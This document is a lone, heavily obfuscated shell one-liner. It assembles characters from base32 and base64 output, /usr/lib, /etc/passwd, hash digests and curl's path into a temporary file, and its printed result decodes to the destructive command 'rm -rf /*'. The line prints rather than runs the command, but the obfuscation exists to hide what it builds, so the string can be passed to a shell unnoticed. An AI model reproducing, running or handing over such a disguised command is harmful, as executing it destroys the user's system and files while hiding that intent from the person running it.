for i in $(echo hb|base32|cut -c3|tr A-Z a-z; echo bd|base64|cut -c2-2); do echo $i >> /tmp/opt; done; echo $(ls /usr/lib | grep man | sed '/^m/! d' | head -n 1 | sed 's/.//5g' | grep -o '.$') >> /tmp/opt; cat /etc/passwd | head -n1 | sed 's/o.*//g' >> /tmp/opt; echo apt | md5sum | rev | cut -d" " -f3 | sha256sum | cut -c58 >> /tmp/opt; dirname /bin/curl | awk '{print substr($0,1,1)}' >> /tmp/opt; echo \* >> /tmp/opt; cat /tmp/opt | tr "\n" " " | sed 's/\ //g' | sed 's/./& /2;s/./& /6'
